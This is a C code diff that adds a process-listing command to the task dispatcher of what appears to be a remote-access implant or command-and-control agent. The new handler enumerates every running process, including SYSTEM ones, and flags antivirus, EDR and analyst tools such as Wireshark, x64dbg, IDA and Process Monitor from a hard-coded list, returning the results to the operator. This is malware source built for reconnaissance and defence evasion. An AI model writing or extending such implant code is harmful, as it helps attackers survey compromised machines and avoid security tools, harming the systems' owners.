@@ -339,6 +339,61 @@ void dispatch_task(AgentTask *task) {
         agent_send_result(task->id, out, "");
         free(out);
     }
+    else if (strcmp(type_upper, "PS_JSON") == 0) {
+        /* Return JSON array [{pid:N,name:"..."},...] via CreateToolhelp32Snapshot
+         * — no OpenProcess needed, so all processes (including SYSTEM) are visible */
+        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (snap == INVALID_HANDLE_VALUE) {
+            agent_send_result(task->id, "", "CreateToolhelp32Snapshot failed"); return;
+        }
+        /* Pre-build security-tool set for labelling */
+        static const char *SEC_TOOLS[] = {
+            "msseces.exe","msmpeng.exe","mcshield.exe","avgwdsvc.exe","avguard.exe",
+            "bdagent.exe","ekrn.exe","fshoster32.exe","sophosav.exe","mbam.exe",
+            "wireshark.exe","fiddler.exe","x64dbg.exe","ollydbg.exe","idaq.exe","idaq64.exe",
+            "procmon.exe","procmon64.exe","procexp.exe","procexp64.exe",NULL
+        };
+        /* Grow buffer dynamically */
+        size_t cap = 65536, len = 0;
+        char *buf = (char*)malloc(cap);
+        if (!buf) { CloseHandle(snap); agent_send_result(task->id,"","oom"); return; }
+        buf[len++] = '[';
+
+        PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
+        BOOL first_entry = TRUE;
+        if (Process32First(snap, &pe)) {
+            do {
+                /* check security tool */
+                const char *sec = "";
+                for (int si = 0; SEC_TOOLS[si]; si++) {
+                    if (_stricmp(pe.szExeFile, SEC_TOOLS[si]) == 0) { sec = "AV/EDR"; break; }
+                }
+                char entry[512];
+                int elen = snprintf(entry, sizeof(entry),
+                    "%s{\"pid\":%lu,\"name\":\"%s\"%s%s}",
+                    first_entry ? "" : ",",
+                    (unsigned long)pe.th32ProcessID,
+                    pe.szExeFile,
+                    sec[0] ? ",\"security\":\"" : "",
+                    sec[0] ? "AV/EDR\"" : "");
+                first_entry = FALSE;
+                /* grow if needed */
+                while (len + (size_t)elen + 4 >= cap) {
+                    cap *= 2;
+                    char *nb = (char*)realloc(buf, cap);
+                    if (!nb) { free(buf); CloseHandle(snap); agent_send_result(task->id,"","oom"); return; }
+                    buf = nb;
+                }
+                memcpy(buf + len, entry, (size_t)elen);
+                len += (size_t)elen;
+            } while (Process32Next(snap, &pe));
+        }
+        CloseHandle(snap);
+        buf[len++] = ']';
+        buf[len]   = '\0';
+        agent_send_result(task->id, buf, "");
+        free(buf);
+    }
     else if (strcmp(type_upper, "PWD") == 0) {
         char cwd[MAX_PATH] = {0};
         GetCurrentDirectoryA(sizeof(cwd), cwd);
